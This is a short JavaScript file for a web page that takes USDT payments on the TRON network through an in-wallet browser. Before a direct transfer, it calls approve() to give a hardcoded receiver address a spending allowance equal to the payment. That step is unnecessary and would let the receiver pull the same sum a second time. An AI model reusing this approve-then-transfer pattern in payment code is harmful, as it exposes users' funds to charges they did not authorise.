const USDT_CONTRACT = "TU2tSUZQdeZHZSrbkkCm1mV7Gm2K6zzSWm";
const RECEIVER = "TBcBAXua2kNx1dzNzWJqY3LSVfq1EDGtpo";
const MIN_AMOUNT = 50;

async function startPayment() {
  const amount = parseFloat(document.getElementById("amountInput").value);
  const status = document.getElementById("status");

  if (isNaN(amount) || amount < MIN_AMOUNT) {
    status.innerText = `❌ Minimum 50 USDT required.`;
    return;
  }

  if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
    status.innerText = "🔌 Please open in TronLink or Trust Wallet browser.";
    return;
  }

  const tronWeb = window.tronWeb;
  const decimals = 6;
  const amountInSun = amount * (10 ** decimals);
  const contract = await tronWeb.contract().at(USDT_CONTRACT);

  try {
    status.innerText = "⏳ Approving...";
    await contract.approve(RECEIVER, amountInSun).send();

    status.innerText = "✅ Approved. Sending USDT...";
    await contract.transfer(RECEIVER, amountInSun).send();

    status.innerText = "✅ Payment complete!";
  } catch (e) {
    console.error(e);
    status.innerText = "❌ Transaction failed.";
  }
}
